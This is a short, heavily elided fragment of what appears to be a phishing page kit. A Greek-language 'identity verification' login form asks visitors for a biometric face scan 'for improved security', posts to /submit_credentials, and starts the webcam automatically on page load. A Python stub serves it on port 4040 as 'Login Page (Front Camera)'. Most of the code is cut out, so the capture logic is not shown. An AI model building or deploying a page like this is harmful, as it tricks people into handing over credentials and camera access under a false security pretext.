...
<body>
    <div class="main-container">
        ...
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Επαλήθευση Ταυτότητας</h1>
                <p>Για βελτιωμένη ασφάλεια, παρακαλούμε τοποθετήστε το πρόσωπό σας για μια γρήγορη βιομετρική σάρωση για να συνεχίσετε.</p>
    ...
    <script>
        ...
        async function startCamera() {
            ...
            } catch (err) { console.error("Η πρόσβαση στην κάμερα απέτυχε:", err); }
        }
        startCamera();
    </script>
</body>
...
if __name__ == '__main__':
    ...
    port = 4040
    script_name = "Σελίδα Σύνδεσης (Μπροστινή Κάμερα)"
